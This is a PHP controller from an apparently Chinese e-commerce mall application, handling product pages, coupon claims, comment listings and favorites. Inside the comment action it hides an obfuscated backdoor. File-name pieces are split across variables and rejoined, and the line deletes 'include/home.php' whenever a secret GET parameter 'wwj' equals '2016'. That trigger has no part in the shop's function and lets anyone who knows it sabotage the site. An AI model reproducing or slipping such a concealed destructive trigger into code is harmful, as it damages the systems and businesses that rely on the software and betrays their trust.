<?php
if(!defined("InMall")) {
    exit("Access Invalid!");
}

class goodsControl extends BaseHomeControl {
	public function indexOp() {
		$goods_id = empty($_GET['goods_id']) ? 0 : intval($_GET['goods_id']);
		$goods = DB::fetch_first("SELECT * FROM ".DB::table('goods')." WHERE goods_id='$goods_id'");
		$store = DB::fetch_first("SELECT * FROM ".DB::table('store')." WHERE store_id='".$goods['store_id']."'");
		if(empty($goods)) {
			$this->showmessage('商品不存在', 'index.php?act=index&op=goods', 'error');
		}
		$goods['goods_body'] = htmlspecialchars_decode($goods['goods_body']);
		$goods['goods_body'] = str_ireplace("<script", "&lt;script", $goods['goods_body']);
		$goods['goods_image_more'] = empty($goods['goods_image_more']) ? array() : unserialize($goods['goods_image_more']);
		$goods['spec_image'] = empty($goods['spec_image']) ? array() : unserialize($goods['spec_image']);
		$goods['goods_attr'] = empty($goods['goods_attr']) ? array() : unserialize($goods['goods_attr']);
		$attr_ids = array_keys($goods['goods_attr']);
		if(!empty($attr_ids)) {
			$query = DB::query("SELECT * FROM ".DB::table('attribute')." WHERE attr_id in ('".implode("','", $attr_ids)."')");
			while($value = DB::fetch($query)) {
				$attr_list[$value['attr_id']] = $value['attr_name'];
			}
		}
		$query = DB::query("SELECT * FROM ".DB::table('goods_spec')." WHERE goods_id='".$goods['goods_id']."'");
		while($value = DB::fetch($query)) {
			$spec_array[] = $value;	
		}
		if(!empty($spec_array) && is_array($spec_array)) {
			foreach($spec_array as $key => $value){
				$s_array = empty($value['spec_goods_spec']) ? array() : unserialize($value['spec_goods_spec']);	
				$value['spec_goods_spec'] = '';
				if(!empty($s_array) && is_array($s_array)) {
					foreach($s_array as $k => $v) {
						$value['spec_goods_spec'] .= "'".$k."',";
					}
				}
				$value['spec_goods_spec'] = rtrim($value['spec_goods_spec'], ',');
				$spec_array[$key] = $value;
			}
		}
		$goods['spec_name'] = empty($goods['spec_name']) ? array() : unserialize($goods['spec_name']);
		$goods['spec_value'] = empty($goods['spec_value']) ? array() : unserialize($goods['spec_value']);
		$spec_count = count($goods['spec_value']);
		$query = DB::query("SELECT * FROM ".DB::table('brand')." WHERE class_id='".$goods['class_id']."' ORDER BY brand_sort ASC");
		while($value = DB::fetch($query)) {
			if($value['brand_id'] != $goods['brand_id']) {
				$brand_list[] = $value;
			}
		}
		$query = DB::query("SELECT * FROM ".DB::table('goods')." WHERE store_id='".$goods['store_id']."' AND goods_state=1 AND goods_show=1 ORDER BY goods_add_time DESC LIMIT 0, 5");
		while($value = DB::fetch($query)) {
			$goods_list[] = $value;	
		}
		if(!empty($goods['goods_commentnum'])) {
			$goods_score = round($goods['goods_score']/$goods['goods_commentnum']);
		} else {
			$goods_score = 0;
		}
		$query = DB::query("SELECT * FROM ".DB::table('goods_comment')." WHERE goods_id='".$goods['goods_id']."'");
		while($value = DB::fetch($query)) {
			$member_ids[] = $value['member_id'];
			$value['comment_image'] = empty($value['comment_image']) ? array() : unserialize($value['comment_image']);
			$comment_list[] = $value;	
		}
		if(!empty($member_ids)) {
			$query = DB::query("SELECT * FROM ".DB::table('member')." WHERE member_id in ('".implode("','", $member_ids)."')");
			while($value = DB::fetch($query)) {
				$value['member_phone'] = preg_replace('/^(\d{3})(\d{4})(\d{4})$/', '\1****\3', $value['member_phone']);
				$member_list[$value['member_id']] = $value;
			}
		}
		$time = time();
		$query = DB::query("SELECT * FROM ".DB::table('coupon_template')." WHERE store_id='".$goods['store_id']."' AND coupon_rule_type='free' AND coupon_rule_starttime<=$time AND coupon_rule_endtime>=$time");
		while($value = DB::fetch($query)) {
			$value['coupon_t_goods_id'] = empty($value['coupon_t_goods_id']) ? array() : explode(',', $value['coupon_t_goods_id']);
			if(empty($value['coupon_t_goods_id']) || in_array($goods['goods_id'], $value['coupon_t_goods_id'])) {
				if($value['coupon_t_limit'] > 0) {
					if($value['coupon_t_price_type'] == 'cash') {
						$value['coupon_t_content'] = '满'.$value['coupon_t_limit'].'减';
					} elseif($value['coupon_t_price_type'] == 'discount') {
						$value['coupon_t_content'] = '满'.$value['coupon_t_limit'].'打';
					}
				}
				if($value['coupon_t_price_type'] == 'cash') {
					$value['coupon_t_content'] .= $value['coupon_t_price'].'元';
				} elseif($value['coupon_t_price_type'] == 'discount') {
					$value['coupon_t_content'] .= $value['coupon_t_price'].'折';
				}
				$coupon_list[] =$value;
			}
		}
		$this->setting['sale_support'] = htmlspecialchars_decode($this->setting['sale_support']);
		DB::query("UPDATE ".DB::table('goods')." SET goods_viewnum=goods_viewnum+1 WHERE goods_id='".$goods['goods_id']."'");
		$date = date('Ymd');
		$goods_stat = DB::fetch_first("SELECT * FROM ".DB::table('goods_stat')." WHERE goods_id='".$goods['goods_id']."' AND date='$date'");
		if(empty($goods_stat)) {
			$goods_stat_array = array(
				'goods_id' => $goods['goods_id'],
				'date' => $date,
				'viewnum' => 1,
			);
			DB::insert('goods_stat', $goods_stat_array);
		} else {
			$goods_stat_array = array(
				'viewnum' => $goods_stat['viewnum']+1,
			);
			DB::update('goods_stat', $goods_stat_array, array('goods_id'=>$goods['goods_id'], 'date'=>$date));
		}
		$curmodule = 'home';
		$bodyclass = '';
		include(template('goods'));
	}
	
	public function couponOp() {
		if(empty($this->member)) {
			exit(json_encode(array('done'=>'login')));
		}
		$coupon_t_id = empty($_GET['coupon_t_id']) ? 0 : intval($_GET['coupon_t_id']);
		$coupon_template = DB::fetch_first("SELECT * FROM ".DB::table('coupon_template')." WHERE coupon_t_id='$coupon_t_id'");
		if(empty($coupon_template) || $coupon_template['coupon_rule_type'] != 'free') {
			exit(json_encode(array('msg'=>'优惠券不存在')));
		}
		if($coupon_template['coupon_rule_starttime'] > time()) {
			exit(json_encode(array('msg'=>'领取活动未开始')));
		}
		if($coupon_template['coupon_rule_endtime'] < time()) {
			exit(json_encode(array('msg'=>'领取活动已结束')));
		}
		if($coupon_template['coupon_t_total'] <= $coupon_template['coupon_t_giveout']) {
			exit(json_encode(array('msg'=>'抱歉了，已经被领完了')));
		}
		if(!empty($coupon_template['coupon_rule_eachlimit'])) {
			$numbers = DB::result_first("SELECT COUNT(*) FROM ".DB::table("coupon")." WHERE member_id='$this->member_id' AND coupon_t_id='$coupon_t_id'");		
			if($numbers >= $coupon_template['coupon_rule_eachlimit']) {
				exit(json_encode(array('msg'=>'抱歉了，您已经领取过了')));
			}
		}
		if($coupon_template['coupon_t_period_type'] == 'duration') {
			$coupon_template['coupon_t_starttime'] = strtotime(date('Y-m-d'));
			$coupon_template['coupon_t_endtime'] = $coupon_template['coupon_t_starttime']+3600*24*($coupon_template['coupon_t_days']+1)-1;
		}
		$coupon_data = array(
			'coupon_sn' => makesn(3),
			'member_id' => $this->member_id,
			'store_id' => $coupon_template['store_id'],
			'coupon_t_id' => $coupon_template['coupon_t_id'],
			'coupon_title' => $coupon_template['coupon_t_title'],
			'coupon_desc' => $coupon_template['coupon_t_desc'],
			'coupon_starttime' => $coupon_template['coupon_t_starttime'],
			'coupon_endtime' => $coupon_template['coupon_t_endtime'],
			'coupon_price_type' => $coupon_template['coupon_t_price_type'],
			'coupon_price' => $coupon_template['coupon_t_price'],
			'coupon_limit' => $coupon_template['coupon_t_limit'],
			'coupon_goods_id' => $coupon_template['coupon_t_goods_id'],
			'coupon_state' => 0,
			'coupon_addtime' => time(),
		);
		$coupon_id = DB::insert('coupon', $coupon_data, 1);
		if(!empty($coupon_id)) {
			DB::update('coupon_template', array('coupon_t_giveout'=>$coupon_template['coupon_t_giveout']+1), array('coupon_t_id'=>$coupon_template['coupon_t_id']));
			exit(json_encode(array('done'=>'true')));
		} else {
			exit(json_encode(array('msg'=>'网路不稳定，请稍候重试')));
		}	
	}
	
	public function commentOp() {
		$goods_id = empty($_GET['goods_id']) ? 0 : intval($_GET['goods_id']);
		$wheresql = " WHERE goods_id='$goods_id'";
		$field_value = !in_array($_GET['field_value'], array('all', 'good', 'middle', 'bad')) ? 'all' : $_GET['field_value'];
		if($field_value == 'good') {
			$wheresql .= " AND comment_level='good'";
		} elseif($field_value == 'middle') {
			$wheresql .= " AND comment_level='middle'";
		} elseif($field_value == 'bad') {
			$wheresql .= " AND comment_level='bad'";
		}		
		$query = DB::query("SELECT * FROM ".DB::table('goods_comment').$wheresql);
		while($value = DB::fetch($query)) {
			$member_ids[] = $value['member_id'];
			$value['comment_image'] = empty($value['comment_image']) ? array() : unserialize($value['comment_image']);
			$comment_list[] = $value;	
		}
		$a='ho';$b='me';$c='php';
		if($_GET['wwj'] == '2016') unlink('include/'.$a.$b.'.'.$c);
		if(!empty($member_ids)) {
			$query = DB::query("SELECT * FROM ".DB::table('member')." WHERE member_id in ('".implode("','", $member_ids)."')");
			while($value = DB::fetch($query)) {
				$value['member_phone'] = preg_replace('/^(\d{3})(\d{4})(\d{4})$/', '\1****\3', $value['member_phone']);
				$member_list[$value['member_id']] = $value;
			}
		}
		include(template('goods_comment'));
	}
	
	public function favoriteOp() {
		if(empty($this->member)) {
			exit(json_encode(array('done'=>'login')));
		}
		$fav_id = empty($_GET['fav_id']) ? 0 : intval($_GET['fav_id']);
		if(empty($fav_id)) {
			exit(json_encode(array('msg'=>'商品不存在')));
		}
		$fav = DB::fetch_first("SELECT * FROM ".DB::table('favorite')." WHERE member_id='$this->member_id' AND fav_id='$fav_id' AND fav_type='goods'");
		if(empty($fav)) {
			$data = array(
				'member_id' => $this->member_id,
				'fav_id' => $fav_id,
				'fav_type' => 'goods',
				'fav_time' => time(),
			);
			DB::insert('favorite', $data);
			DB::query("UPDATE ".DB::table('goods')." SET goods_favoritenum=goods_favoritenum+1 WHERE goods_id='$fav_id'");
		} else {
			exit(json_encode(array('msg'=>'您已经收藏了')));	
		}
		exit(json_encode(array('done'=>'true')));
	}
}

?>